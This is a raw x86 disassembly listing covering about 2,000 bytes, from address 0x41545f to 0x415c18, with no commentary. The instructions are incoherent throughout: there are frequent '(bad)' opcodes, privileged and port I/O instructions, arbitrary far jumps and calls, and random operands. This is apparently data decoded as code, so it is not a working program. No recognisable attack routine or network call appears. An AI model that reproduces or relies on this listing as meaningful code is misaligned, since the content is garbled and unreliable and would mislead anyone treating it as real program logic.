  41545f:	adc    DWORD PTR [ebx-0x4fcc07cb],ebp
  415465:	cli    
  415466:	lea    ebp,[edi+0x66]
  415469:	push   eax
  41546a:	adc    esi,eax
  41546c:	mov    WORD PTR [edi],gs
  41546e:	shl    DWORD PTR ds:0x529ee6e1,1
  415474:	shl    bl,0x77
  415477:	push   edx
  415478:	test   al,0x15
  41547a:	inc    edi
  41547b:	sub    al,0xc0
  41547d:	dec    ebp
  41547e:	push   esp
  41547f:	xor    al,0x56
  415481:	jb     0x4154ab
  415483:	ret    0xc4c3
  415486:	mov    ah,0x6d
  415488:	pop    ebx
  415489:	lea    ebx,[eax+0xd7bee6b]
  41548f:	fisttp DWORD PTR [edx-0x212ddc5d]
  415495:	dec    ebx
  415496:	nop
  415497:	xchg   edx,eax
  415498:	(bad)  
  415499:	aam    0x9a
  41549b:	test   BYTE PTR [edx-0x31],dh
  41549e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41549f:	gs mov ebx,0xa0284dc1
  4154a5:	and    eax,0xb6cded8b
  4154aa:	daa    
  4154ab:	sub    bh,bh
  4154ad:	cmp    eax,0xdcc6bc7e
  4154b2:	repnz xlat BYTE PTR ds:[ebx]
  4154b4:	xchg   esi,eax
  4154b5:	std    
  4154b6:	cmp    al,BYTE PTR [edx]
  4154b8:	loop   0x41549f
  4154ba:	push   eax
  4154bb:	sub    dh,dh
  4154bd:	jl     0x4154c5
  4154bf:	inc    esp
  4154c0:	jnp    0x4154dc
  4154c2:	dec    esp
  4154c3:	sbb    al,BYTE PTR [ebx-0x79b9e431]
  4154c9:	xchg   ecx,eax
  4154ca:	arpl   WORD PTR [eax-0x7b454977],si
  4154d0:	sub    BYTE PTR [ecx],0xdd
  4154d3:	test   DWORD PTR [ebp+0x856bb9d],ebp
  4154d9:	lock add eax,0x2cc9f72f
  4154df:	dec    esp
  4154e0:	push   esp
  4154e1:	sahf   
  4154e2:	es ja  0x4154c7
  4154e5:	mov    bh,0xf9
  4154e7:	jae    0x4154ca
  4154e9:	inc    ebp
  4154ea:	repz daa 
  4154ec:	div    DWORD PTR [edi+0x3f]
  4154ef:	mov    ecx,0x97defde8
  4154f4:	adc    ebx,DWORD PTR [ebx+ebp*4-0x5d2acad8]
  4154fb:	inc    esi
  4154fc:	xor    DWORD PTR [ecx+ebx*1],ebx
  4154ff:	mov    ch,0x37
  415501:	push   cs
  415502:	pop    ebx
  415503:	push   esp
  415504:	pop    esp
  415505:	cli    
  415506:	test   DWORD PTR [ecx-0x52e4402b],0x42920cb1
  415510:	pop    esi
  415511:	or     dl,cl
  415513:	mov    dl,0x85
  415515:	shl    DWORD PTR [edx+0x70e1fa46],1
  41551b:	push   esi
  41551c:	cwde   
  41551d:	jge    0x4154e6
  41551f:	fidiv  WORD PTR [esi-0x27e66bfb]
  415525:	imul   edi,DWORD PTR ds:0xf16e4659,0x1d
  41552c:	lods   eax,DWORD PTR ds:[esi]
  41552d:	pop    ecx
  41552e:	aas    
  41552f:	cmp    al,0x8d
  415531:	adc    BYTE PTR [edx+0x6c],cl
  415534:	mov    bl,0x6f
  415536:	je     0x415542
  415538:	fld    DWORD PTR [eax]
  41553a:	pusha  
  41553b:	scas   al,BYTE PTR es:[edi]
  41553c:	lock sbb cl,BYTE PTR [edi-0x528485b]
  415543:	adc    al,0x8f
  415545:	push   0xfe0635e
  41554a:	pop    esp
  41554b:	out    0x58,al
  41554d:	mov    WORD PTR [ebx-0x28],es
  415550:	ins    DWORD PTR es:[edi],dx
  415551:	sahf   
  415552:	test   al,0xd
  415554:	pop    ss
  415555:	sub    DWORD PTR [esi],ecx
  415557:	adc    DWORD PTR [edx-0x2f],esp
  41555a:	bound  esi,QWORD PTR [esi-0x62a67c82]
  415560:	pop    ebp
  415561:	ss push ds
  415563:	push   edi
  415564:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415565:	repz pop esp
  415567:	sub    ch,BYTE PTR ds:0x6237900b
  41556d:	lods   al,BYTE PTR ds:[esi]
  41556e:	mov    WORD PTR [eax-0x69],ss
  415571:	xor    DWORD PTR [ecx-0x4a],ecx
  415574:	mov    bl,cl
  415576:	retf   
  415577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415579:	shr    dh,1
  41557b:	icebp  
  41557c:	pop    esp
  41557d:	push   cs
  41557e:	mov    eax,ds:0x239faebd
  415583:	jnp    0x415595
  415585:	jns    0x415512
  415587:	push   ds
  415588:	es ins BYTE PTR es:[edi],dx
  41558a:	loop   0x415537
  41558c:	xchg   esp,eax
  41558d:	stos   DWORD PTR es:[edi],eax
  41558e:	jecxz  0x415573
  415590:	mov    ds:0xf367c17b,al
  415595:	test   al,0xe8
  415597:	jp     0x415556
  415599:	dec    ebx
  41559a:	or     edi,DWORD PTR [edx+0x55]
  41559d:	js     0x415541
  41559f:	ret    0x2426
  4155a2:	stos   DWORD PTR es:[edi],eax
  4155a3:	mov    dh,0x75
  4155a5:	cmp    eax,0x555ccc69
  4155aa:	(bad)  
  4155ab:	jle    0x415559
  4155ad:	lods   al,BYTE PTR ds:[esi]
  4155ae:	inc    ebp
  4155af:	mov    ebx,eax
  4155b1:	mov    gs,WORD PTR [edi+0x5f]
  4155b4:	mov    edi,0x39583789
  4155b9:	ficom  DWORD PTR [esi+0x3c]
  4155bc:	cwde   
  4155bd:	mov    dh,0xa0
  4155bf:	pop    eax
  4155c0:	inc    eax
  4155c1:	aaa    
  4155c2:	ins    DWORD PTR es:[edi],dx
  4155c3:	je     0x415619
  4155c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155c6:	idiv   DWORD PTR [ebp+0x53]
  4155c9:	in     al,0xfc
  4155cb:	sbb    eax,0x12b94be4
  4155d0:	lods   eax,DWORD PTR ds:[esi]
  4155d1:	jg     0x415587
  4155d3:	lods   eax,DWORD PTR ds:[esi]
  4155d4:	mov    bh,BYTE PTR [ebx-0x5a65f413]
  4155da:	mov    edi,0x78e38818
  4155df:	aaa    
  4155e0:	dec    eax
  4155e1:	mov    dh,0x20
  4155e3:	push   ebx
  4155e4:	mov    al,ds:0xb176e9b
  4155e9:	es ss push 0x93f1a01
  4155f0:	push   esi
  4155f1:	mov    edx,0x98a6f0fa
  4155f6:	push   ecx
  4155f7:	sbb    BYTE PTR [ecx+0x38],dh
  4155fa:	sbb    DWORD PTR [edi],edi
  4155fc:	shl    DWORD PTR [ebx],cl
  4155fe:	mov    eax,0xf30042e8
  415603:	push   esi
  415604:	sbb    esi,esi
  415606:	adc    eax,0x9a347a2a
  41560b:	xchg   ebx,eax
  41560c:	dec    ecx
  41560d:	icebp  
  41560e:	pop    edx
  41560f:	(bad)  
  415610:	jge    0x4155e0
  415612:	imul   edi,DWORD PTR [esi],0xd98f613b
  415618:	fst    DWORD PTR [edx+esi*2+0x1a8902f6]
  41561f:	add    DWORD PTR es:[edi+esi*1-0x29],0xf05f6fbf
  415628:	(bad)  
  415629:	out    0xa,al
  41562b:	xor    DWORD PTR [edi],0x21
  41562e:	mov    es,WORD PTR [ebp+ebp*1+0x3b3f111a]
  415635:	dec    ebx
  415636:	cs pop esp
  415638:	mov    esp,0x507017c
  41563d:	xor    ebp,DWORD PTR [ebp-0x43]
  415640:	mov    esi,0xa0fd36a2
  415645:	popf   
  415646:	dec    edx
  415647:	(bad)  
  415648:	popa   
  415649:	leave  
  41564a:	icebp  
  41564b:	sbb    al,0xc7
  41564d:	ins    DWORD PTR es:[edi],dx
  41564e:	mov    dh,0x97
  415650:	repz aam 0xd7
  415653:	hlt    
  415654:	bound  esp,QWORD PTR [esp+eiz*8+0x5274579a]
  41565b:	sub    al,0xb2
  41565d:	fwait
  41565e:	lea    esp,[edx+edi*4]
  415661:	add    eax,0xcee7af23
  415666:	sbb    al,BYTE PTR [ebx+0x2e]
  415669:	cmp    bh,BYTE PTR [ebx-0x72c3a0cd]
  41566f:	int3   
  415670:	jae    0x4156c1
  415672:	push   esi
  415673:	cmp    al,0xd3
  415675:	jmp    0x98d34cb3
  41567a:	add    ecx,ecx
  41567c:	popf   
  41567d:	mov    dh,0x3a
  41567f:	add    al,0x3d
  415681:	xchg   ecx,eax
  415682:	cmp    BYTE PTR [ebp+0x58],0x88
  415686:	xchg   edx,eax
  415687:	mov    ch,0x4
  415689:	mov    eax,0xe23e9ba4
  41568e:	or     BYTE PTR [edx],ch
  415690:	jno    0x4156ad
  415692:	inc    eax
  415693:	dec    ecx
  415694:	dec    esi
  415695:	pop    esi
  415696:	outs   dx,BYTE PTR ds:[esi]
  415697:	fidivr WORD PTR cs:[ebp+0x1a]
  41569b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41569c:	sub    bl,BYTE PTR [eax]
  41569e:	push   esi
  41569f:	and    bh,BYTE PTR [esi-0x3b]
  4156a2:	pop    esi
  4156a3:	mov    bh,0x7a
  4156a5:	ja     0x4156b1
  4156a7:	mov    cl,BYTE PTR [ebp-0x26da1070]
  4156ad:	sbb    BYTE PTR [eax+0x517cc2f3],dh
  4156b3:	xor    DWORD PTR [ebx-0x48],ecx
  4156b6:	aas    
  4156b7:	xlat   BYTE PTR ds:[ebx]
  4156b8:	pushf  
  4156b9:	sbb    al,0xe7
  4156bb:	jg     0x415735
  4156bd:	cmc    
  4156be:	inc    ebx
  4156bf:	call   0x4dc3:0xd97b11b1
  4156c6:	stos   BYTE PTR es:[edi],al
  4156c7:	mov    bh,0x2d
  4156c9:	jns    0x415693
  4156cb:	xchg   edi,eax
  4156cc:	ins    DWORD PTR es:[edi],dx
  4156cd:	das    
  4156ce:	test   al,0xd5
  4156d0:	pop    es
  4156d1:	pusha  
  4156d2:	xchg   edi,eax
  4156d3:	and    ah,ch
  4156d5:	pop    ebp
  4156d6:	and    ebp,DWORD PTR [esp+edx*1+0x5d4401ce]
  4156dd:	ins    BYTE PTR es:[edi],dx
  4156de:	add    eax,0x1e232932
  4156e3:	adc    eax,0xfb396c86
  4156e8:	mov    esi,0xd1cf79ab
  4156ed:	out    dx,al
  4156ee:	adc    esi,DWORD PTR [edi+eax*8+0x47]
  4156f2:	fwait
  4156f3:	dec    edi
  4156f4:	fst    DWORD PTR ds:0x96740a3c
  4156fa:	jp     0x4156ff
  4156fc:	out    dx,eax
  4156fd:	scas   eax,DWORD PTR es:[edi]
  4156fe:	adc    bh,BYTE PTR [ecx]
  415700:	mov    cl,0x36
  415702:	into   
  415703:	shl    edx,cl
  415705:	(bad)  
  415706:	fidiv  WORD PTR [edx-0x22a44ec6]
  41570c:	add    edi,ebx
  41570e:	sub    BYTE PTR [ebp+ebp*4-0x24a1f3d1],ch
  415715:	inc    ecx
  415716:	sbb    ecx,esp
  415718:	jg     0x4156a9
  41571a:	sbb    edx,edi
  41571c:	enter  0xcfd6,0x54
  415720:	sbb    eax,0xca65981f
  415725:	mov    eax,0xc9bd4a78
  41572a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41572b:	ror    BYTE PTR ds:0xd330361a,0x85
  415732:	ins    DWORD PTR es:[edi],dx
  415733:	cmp    al,0x40
  415735:	mov    ch,0xff
  415737:	inc    ecx
  415738:	sbb    DWORD PTR [edx-0x1b90a22a],0xffffff98
  41573f:	xchg   ebx,eax
  415740:	je     0x415771
  415742:	jp     0x415766
  415744:	call   DWORD PTR [ecx-0xa5a5499]
  41574a:	into   
  41574b:	pop    ebx
  41574c:	popa   
  41574d:	mov    al,0x18
  41574f:	mov    edi,0x2971c233
  415754:	mov    al,0x18
  415756:	fistp  DWORD PTR [edx]
  415758:	adc    eax,0x20a36437
  41575d:	gs fmul st(0),st
  415760:	arpl   bx,cx
  415762:	pop    ebp
  415763:	icebp  
  415764:	or     ch,ch
  415766:	lock int3 
  415768:	xchg   edx,eax
  415769:	sbb    dh,dh
  41576b:	or     eax,0x4257e9d
  415770:	mov    al,0x3c
  415772:	sub    BYTE PTR [ecx-0x1d],0x9f
  415776:	pop    esi
  415777:	(bad)  
  415778:	ss push esi
  41577a:	push   esp
  41577b:	and    bl,BYTE PTR [ecx]
  41577d:	add    BYTE PTR [esi+0x1894d11b],ch
  415783:	fmul   st,st(1)
  415785:	mov    ch,0xe7
  415787:	in     eax,0x9a
  415789:	xor    ch,BYTE PTR [ecx+0x26]
  41578c:	mov    bh,0xf1
  41578e:	popa   
  41578f:	jb     0x415716
  415791:	xor    bl,BYTE PTR [eax-0x4c3d14b9]
  415797:	mov    dl,0x7d
  415799:	push   ecx
  41579a:	mov    ebp,0x3be01aaf
  41579f:	push   es
  4157a0:	add    esi,0x65
  4157a3:	sub    eax,DWORD PTR [edi-0x7d]
  4157a6:	(bad)  
  4157a7:	mov    edi,0xea1fc0fb
  4157ac:	in     eax,dx
  4157ad:	push   ebx
  4157ae:	and    ecx,DWORD PTR [edx-0x24454e2]
  4157b4:	sub    DWORD PTR [ecx],esp
  4157b6:	inc    ebp
  4157b7:	(bad)  
  4157b8:	repnz and al,BYTE PTR [edi-0x468484dc]
  4157bf:	sub    edi,esi
  4157c1:	push   0x7f
  4157c3:	cli    
  4157c4:	mov    ebp,esi
  4157c6:	adc    BYTE PTR [edi],dl
  4157c8:	push   ecx
  4157c9:	cdq    
  4157ca:	repnz sub esp,DWORD PTR [eax+edx*2-0x2c]
  4157cf:	adc    al,0x85
  4157d1:	push   ecx
  4157d2:	push   esi
  4157d3:	inc    eax
  4157d4:	sub    cl,0x0
  4157d7:	and    eax,0x2f1f2314
  4157dc:	xchg   ebx,eax
  4157dd:	mov    ecx,0xb43a744d
  4157e2:	test   BYTE PTR ds:0xd7b38f57,0x9e
  4157e9:	cs repz test al,0x57
  4157ed:	push   ebp
  4157ee:	lods   al,BYTE PTR ds:[esi]
  4157ef:	pop    es
  4157f0:	(bad)  
  4157f1:	(bad)  
  4157f2:	dec    eax
  4157f3:	mov    cl,0xa9
  4157f5:	xchg   edi,eax
  4157f6:	add    bl,BYTE PTR [edx-0x25e6da9b]
  4157fc:	dec    ebx
  4157fd:	test   BYTE PTR [edi-0x63ede7e4],bh
  415803:	jecxz  0x415877
  415805:	sahf   
  415806:	sub    al,BYTE PTR [esi+eiz*4]
  415809:	das    
  41580a:	int3   
  41580b:	imul   eax,DWORD PTR [ebx+0x1935b7d8],0x1d5daeb5
  415815:	pop    eax
  415816:	xor    ch,BYTE PTR [ecx-0x7da48077]
  41581c:	popf   
  41581d:	arpl   WORD PTR [ecx+0x3e252f5],bp
  415823:	in     al,0x8b
  415825:	push   ds
  415826:	les    ecx,FWORD PTR [edi+edi*2-0x7b]
  41582a:	sub    edi,edi
  41582c:	fwait
  41582d:	lock hlt 
  41582f:	jo     0x41588e
  415831:	nop
  415832:	add    cl,BYTE PTR [eax-0x2e]
  415835:	and    BYTE PTR [eax-0x128a42d2],ch
  41583b:	push   esp
  41583c:	pop    edi
  41583d:	fimul  DWORD PTR [eax-0x56]
  415840:	clc    
  415841:	stos   DWORD PTR es:[edi],eax
  415842:	bound  esp,QWORD PTR [ebx+0x4d]
  415845:	scas   al,BYTE PTR es:[edi]
  415846:	pusha  
  415847:	cld    
  415848:	cmp    edi,DWORD PTR [esi+eiz*1+0x71]
  41584c:	adc    eax,0xff5a2dd9
  415851:	sbb    esp,DWORD PTR [edi+0xd]
  415854:	push   ebp
  415855:	iret   
  415856:	dec    edx
  415857:	ret    
  415858:	or     DWORD PTR [edx+0x11c00823],edi
  41585e:	dec    edi
  41585f:	dec    ecx
  415860:	or     al,0x7
  415862:	aad    0xa1
  415864:	scas   eax,DWORD PTR es:[edi]
  415865:	call   0x639e361d
  41586a:	sbb    al,0xc5
  41586c:	repnz push esp
  41586e:	sub    al,BYTE PTR [ebx-0x69]
  415871:	mov    edx,0xa5cf8147
  415876:	stos   DWORD PTR es:[edi],eax
  415877:	inc    ebx
  415878:	mov    ds:0xcd51da3f,al
  41587d:	xchg   ebx,eax
  41587e:	jne    0x415856
  415880:	std    
  415881:	push   ds
  415882:	dec    edx
  415883:	push   edi
  415884:	scas   eax,DWORD PTR es:[edi]
  415885:	add    ecx,esp
  415887:	enterw 0x54c5,0x54
  41588c:	xchg   BYTE PTR [ecx+ecx*4+0x6],bh
  415890:	adc    al,0x8
  415892:	jmp    0x415910
  415894:	int3   
  415895:	ror    ecx,1
  415897:	add    al,0xcd
  415899:	outs   dx,BYTE PTR ds:[esi]
  41589a:	xor    BYTE PTR [ecx-0x4a],dh
  41589d:	adc    BYTE PTR [ebx-0x629d66b1],0x50
  4158a4:	inc    ebx
  4158a5:	sti    
  4158a6:	mov    bl,0x74
  4158a8:	nop
  4158a9:	fwait
  4158aa:	inc    ecx
  4158ab:	inc    esi
  4158ac:	jbe    0x4158cf
  4158ae:	add    edx,DWORD PTR [ebp+0x0]
  4158b1:	outs   dx,BYTE PTR ds:[esi]
  4158b2:	push   edx
  4158b3:	jno    0x4158c8
  4158b5:	retf   
  4158b6:	js     0x415918
  4158b8:	xchg   edx,eax
  4158b9:	pop    ebx
  4158ba:	mov    edx,0xd2a83368
  4158bf:	or     edi,ebx
  4158c1:	repnz dec eax
  4158c3:	aam    0xd3
  4158c5:	int    0x9f
  4158c7:	jge    0x415898
  4158c9:	int3   
  4158ca:	jmp    0xb5bf0fb
  4158cf:	or     eax,0x3e1a90f4
  4158d4:	cmp    eax,DWORD PTR [edi+0x1ceac13a]
  4158da:	(bad)  
  4158db:	test   eax,0xa64efa57
  4158e0:	vmsave 
  4158e3:	stc    
  4158e4:	sbb    ebx,ebp
  4158e6:	xor    eax,0x780d9cfe
  4158eb:	fadd   QWORD PTR ds:0x3fd181b9
  4158f1:	cmp    esi,DWORD PTR ds:0xb3d7229e
  4158f7:	sti    
  4158f8:	push   edx
  4158f9:	push   esp
  4158fa:	ins    BYTE PTR es:[edi],dx
  4158fb:	pop    edx
  4158fc:	popf   
  4158fd:	shr    BYTE PTR [edi-0x66],cl
  415900:	ss dec ecx
  415902:	pop    ds
  415903:	jge    0x41595d
  415905:	call   0x4e747041
  41590a:	mov    al,BYTE PTR [edi+esi*4+0x3d3b1835]
  415911:	arpl   WORD PTR ds:0x7aa01c4c,bp
  415917:	jae    0x4158d5
  415919:	mov    esp,DWORD PTR [edx-0x560f9c1a]
  41591f:	das    
  415920:	inc    ebx
  415921:	ins    BYTE PTR es:[edi],dx
  415922:	dec    esp
  415923:	in     eax,dx
  415924:	cld    
  415925:	add    ah,ch
  415927:	push   esp
  415928:	(bad)  
  41592a:	cli    
  41592b:	sbb    edi,DWORD PTR [ecx-0x63628b75]
  415931:	repz mul eax
  415934:	repz jle 0x415900
  415937:	and    eax,0xbcfa7d75
  41593c:	mov    eax,ds:0x9c11af7
  415941:	cmp    eax,0x59f98ce4
  415946:	aaa    
  415947:	retf   0x632
  41594a:	jmp    0xbd654c8c
  41594f:	aam    0xc1
  415951:	push   esp
  415952:	outs   dx,DWORD PTR ds:[esi]
  415953:	sbb    BYTE PTR [ebp+0x21e91c0],0xde
  41595a:	js     0x415970
  41595c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41595d:	adc    bl,dl
  41595f:	mov    DWORD PTR [ebx],0x968773f8
  415965:	pop    ebx
  415966:	xor    ecx,DWORD PTR [ebp+0x5f]
  415969:	imul   ebp,DWORD PTR [eax],0xffffff9b
  41596c:	and    eax,0x4ffaffd3
  415971:	jns    0x41592f
  415973:	add    dl,ch
  415975:	and    ah,BYTE PTR [edx+eax*8]
  415978:	adc    al,0xc3
  41597a:	fwait
  41597b:	loop   0x4159cc
  41597d:	xchg   ebp,eax
  41597e:	adc    ecx,DWORD PTR [ecx-0x36476165]
  415984:	jo     0x4159d5
  415986:	mov    al,ds:0x7159225
  41598b:	jns    0x415983
  41598d:	jae    0x41591a
  41598f:	and    bl,BYTE PTR [edi]
  415991:	sbb    eax,ebp
  415993:	lock mov edx,0x3092b688
  415999:	add    BYTE PTR [eax+0x73364a07],0x84
  4159a0:	and    BYTE PTR ds:0xefd2f661,bh
  4159a6:	(bad)  
  4159a7:	push   ebx
  4159a8:	or     al,0x19
  4159aa:	mov    cl,0xa3
  4159ac:	mov    esi,0x120007ce
  4159b1:	push   0x71
  4159b3:	or     al,0x1c
  4159b5:	(bad)  
  4159b6:	cld    
  4159b7:	popa   
  4159b8:	mov    esi,0xfbd6f25b
  4159bd:	adc    ebx,DWORD PTR [eax-0x62]
  4159c0:	jmp    0xd87d:0x617f0e07
  4159c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159c8:	or     al,0x20
  4159ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159cb:	aas    
  4159cc:	pop    ecx
  4159cd:	(bad)  
  4159ce:	test   DWORD PTR [esi-0x50],0xce549c1e
  4159d5:	aaa    
  4159d6:	mov    ch,0x1
  4159d8:	mov    BYTE PTR [esi-0x14],dh
  4159db:	rcr    DWORD PTR [edi+0x43],cl
  4159de:	xor    esi,edx
  4159e0:	sbb    dh,BYTE PTR [eax+0x4d75fbf0]
  4159e6:	repz xor BYTE PTR [eax],al
  4159e9:	or     eax,0x986b18c8
  4159ee:	adc    eax,0xc567aef5
  4159f3:	push   ss
  4159f4:	pusha  
  4159f5:	scas   eax,DWORD PTR es:[edi]
  4159f6:	inc    esp
  4159f7:	xchg   esp,eax
  4159f8:	cmp    BYTE PTR [edx],dh
  4159fa:	inc    eax
  4159fb:	dec    ebp
  4159fc:	mov    bl,0xb
  4159fe:	mov    ss,WORD PTR [edi+0x3bb90949]
  415a04:	stc    
  415a05:	xchg   ebp,eax
  415a06:	inc    ecx
  415a07:	mov    al,0xc9
  415a09:	cmp    al,0x92
  415a0b:	sbb    DWORD PTR [edx-0x43],esp
  415a0e:	js     0x415a0d
  415a10:	lods   al,BYTE PTR ds:[esi]
  415a11:	loop   0x415a92
  415a13:	xor    ebp,esi
  415a15:	nop
  415a16:	jmp    0xccfccd67
  415a1b:	pop    edi
  415a1c:	adc    eax,esp
  415a1e:	add    eax,0x2b8f758a
  415a23:	xchg   esp,eax
  415a24:	ins    DWORD PTR es:[edi],dx
  415a25:	fnstcw WORD PTR [eax+0x46]
  415a28:	adc    eax,0x5b65dcbb
  415a2d:	inc    ebp
  415a2e:	or     eax,0x95a7501
  415a33:	pop    edx
  415a34:	add    DWORD PTR [eax],esi
  415a36:	jbe    0x415a0f
  415a38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a39:	xchg   al,dh
  415a3b:	mov    BYTE PTR [eax+0x701db200],al
  415a41:	outs   dx,DWORD PTR ds:[esi]
  415a42:	std    
  415a43:	ss in  eax,dx
  415a45:	shl    DWORD PTR [edx],1
  415a47:	lock adc al,0xfe
  415a4a:	xchg   bl,bl
  415a4c:	aam    0xa5
  415a4e:	and    DWORD PTR [ecx-0x72],0xb2c65546
  415a55:	push   eax
  415a56:	push   ss
  415a57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a58:	(bad)  
  415a59:	fisttp DWORD PTR [ebx-0x24]
  415a5c:	in     al,dx
  415a5d:	fimul  WORD PTR [edx+0x46]
  415a60:	test   al,0x13
  415a62:	daa    
  415a63:	push   es
  415a64:	xchg   esp,eax
  415a65:	outs   dx,DWORD PTR ds:[esi]
  415a66:	addr16 dec eax
  415a68:	mov    al,ds:0xb3abee4a
  415a6d:	ficom  DWORD PTR [ebx]
  415a6f:	(bad)  
  415a70:	mov    WORD PTR [ebx],?
  415a72:	das    
  415a73:	cmp    BYTE PTR [edx-0x3c],al
  415a76:	adc    cl,BYTE PTR [ecx]
  415a78:	mov    DWORD PTR [ecx-0x3b],ebx
  415a7b:	lea    ebp,[ebp+0x4b]
  415a7e:	call   0xb5ff978b
  415a83:	lods   al,BYTE PTR ds:[esi]
  415a84:	push   cs
  415a85:	jle    0x415aa1
  415a87:	xchg   edi,eax
  415a88:	and    al,0x31
  415a8a:	inc    edx
  415a8b:	test   BYTE PTR [esi+0x27],ah
  415a8e:	or     bl,0x20
  415a91:	(bad)  
  415a92:	push   0xcaeb53a3
  415a97:	mov    ebx,0xa60afc62
  415a9c:	xor    al,0xc5
  415a9e:	xchg   ebx,eax
  415a9f:	inc    edx
  415aa0:	cwde   
  415aa1:	xchg   edi,eax
  415aa2:	xlat   BYTE PTR ds:[ebx]
  415aa3:	xor    al,0xdb
  415aa5:	int3   
  415aa6:	mov    eax,ds:0xb43c168e
  415aab:	xchg   BYTE PTR [ebx-0x1e745141],bl
  415ab1:	jnp    0x415a80
  415ab3:	imul   edx,DWORD PTR ds:0x57717e7b,0xffffffc3
  415aba:	cmc    
  415abb:	pop    edx
  415abc:	imul   esp,DWORD PTR [ebx],0x7b2742da
  415ac2:	push   ebx
  415ac3:	add    DWORD PTR [edi-0x6db55151],edi
  415ac9:	call   0x4bc:0x17621e0f
  415ad0:	push   edx
  415ad1:	xchg   DWORD PTR [ecx-0x172ac632],edi
  415ad7:	or     BYTE PTR [esi],ah
  415ad9:	sbb    bh,BYTE PTR [edx-0x16bdc388]
  415adf:	inc    ecx
  415ae0:	fsub   QWORD PTR [ebx+0x4ed16218]
  415ae6:	push   esp
  415ae7:	inc    edi
  415ae8:	mov    esi,esi
  415aea:	aas    
  415aeb:	add    BYTE PTR [esi+edi*1-0x346fda77],0xce
  415af3:	stc    
  415af4:	xchg   ebp,eax
  415af5:	cmp    dl,dl
  415af7:	xor    eax,0x73974d2f
  415afc:	push   0xdcf7bf61
  415b01:	dec    ebx
  415b02:	pop    esp
  415b03:	or     DWORD PTR [esi+0x12bc7a0c],eax
  415b09:	adc    eax,0xb80e483b
  415b0e:	into   
  415b0f:	sar    esi,1
  415b11:	shl    DWORD PTR [edi],cl
  415b13:	out    dx,eax
  415b14:	cwde   
  415b15:	or     ah,BYTE PTR [ecx-0xf5f3dd0]
  415b1b:	xchg   esi,eax
  415b1c:	stos   BYTE PTR es:[edi],al
  415b1d:	cmp    eax,0x54b6a539
  415b22:	(bad)  
  415b23:	jmp    0x42abc9fe
  415b28:	inc    edi
  415b29:	mov    dl,0xdf
  415b2b:	inc    ecx
  415b2c:	popa   
  415b2d:	jge    0x415abc
  415b2f:	xor    eax,0x8d14f131
  415b34:	dec    edx
  415b35:	xchg   edx,eax
  415b36:	ret    
  415b37:	fcmovnb st,st(0)
  415b39:	les    ebx,FWORD PTR fs:[edx]
  415b3c:	cld    
  415b3d:	icebp  
  415b3e:	in     eax,0x44
  415b40:	int3   
  415b41:	cmp    ebx,DWORD PTR [ebp+0x7b3796d5]
  415b47:	push   ss
  415b48:	mov    ebp,0x854d3350
  415b4d:	pop    edx
  415b4e:	mov    al,0x6
  415b50:	mov    esi,0xe22c757d
  415b55:	xlat   BYTE PTR ds:[ebx]
  415b56:	mov    cl,0x20
  415b58:	and    ecx,0x61a7304f
  415b5e:	adc    eax,0xdd75ab11
  415b63:	add    ch,BYTE PTR [eax+esi*1+0x79bf7b7b]
  415b6a:	jae    0x415aec
  415b6c:	je     0x415b4c
  415b6e:	cli    
  415b6f:	ret    0xa654
  415b72:	xor    ebx,esi
  415b74:	jae    0x415b49
  415b76:	loopne 0x415b8e
  415b78:	mov    ?,WORD PTR [edx]
  415b7a:	into   
  415b7b:	cwde   
  415b7c:	dec    ebx
  415b7d:	fild   DWORD PTR [ecx]
  415b7f:	push   ds
  415b80:	cmp    al,0x5b
  415b82:	cdq    
  415b83:	pusha  
  415b84:	idiv   DWORD PTR [ebx-0x24ef8e8d]
  415b8a:	cmp    DWORD PTR [esi],eax
  415b8c:	aam    0x56
  415b8e:	loope  0x415bc2
  415b90:	jg     0x415be3
  415b92:	lods   eax,DWORD PTR ds:[esi]
  415b93:	pop    esi
  415b94:	inc    esp
  415b95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b96:	xchg   bh,cl
  415b98:	add    al,0x4b
  415b9a:	popa   
  415b9b:	jno    0x415be2
  415b9d:	fcomi  st,st(0)
  415b9f:	or     edi,esi
  415ba1:	push   edx
  415ba2:	shl    edi,1
  415ba4:	out    dx,eax
  415ba5:	and    al,0xa1
  415ba7:	out    0x21,eax
  415ba9:	out    dx,eax
  415baa:	sbb    cl,cl
  415bac:	jp     0x415c01
  415bae:	mov    esp,0x1578151b
  415bb3:	mov    cs,WORD PTR [eax]
  415bb5:	cmp    eax,0x69f66b9b
  415bba:	mov    bl,0xe6
  415bbc:	leave  
  415bbd:	imul   esi,DWORD PTR [ecx],0xaac7723c
  415bc3:	sub    al,0x69
  415bc5:	sbb    esp,ebx
  415bc7:	fiadd  DWORD PTR [edi]
  415bc9:	outs   dx,BYTE PTR ds:[esi]
  415bca:	dec    eax
  415bcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bcc:	loope  0x415b9a
  415bce:	ret    0x8d97
  415bd1:	ret    
  415bd2:	lds    ecx,FWORD PTR [ecx-0x71]
  415bd5:	retf   
  415bd6:	pop    DWORD PTR [esp+ecx*2-0x4acad154]
  415bdd:	cmc    
  415bde:	jmp    0x35e:0xd291586e
  415be5:	and    al,ah
  415be7:	mov    gs,WORD PTR [edi]
  415be9:	js     0x415b80
  415beb:	sbb    cl,ch
  415bed:	fild   QWORD PTR [eax]
  415bef:	cmp    eax,0x95642bfe
  415bf4:	sub    al,0x99
  415bf6:	hlt    
  415bf7:	in     eax,0xc1
  415bf9:	adc    ecx,edi
  415bfb:	(bad)  
  415bfc:	fnstsw WORD PTR [esi]
  415bfe:	xchg   DWORD PTR [ebp+0x7a80f37d],esi
  415c04:	or     ebp,DWORD PTR [esp+esi*8]
  415c07:	sbb    eax,0x430e1ce7
  415c0c:	rol    BYTE PTR [edx-0x5279d074],0x3d
  415c13:	and    eax,0x8fb2b00f
  415c18:	xchg   edi,eax
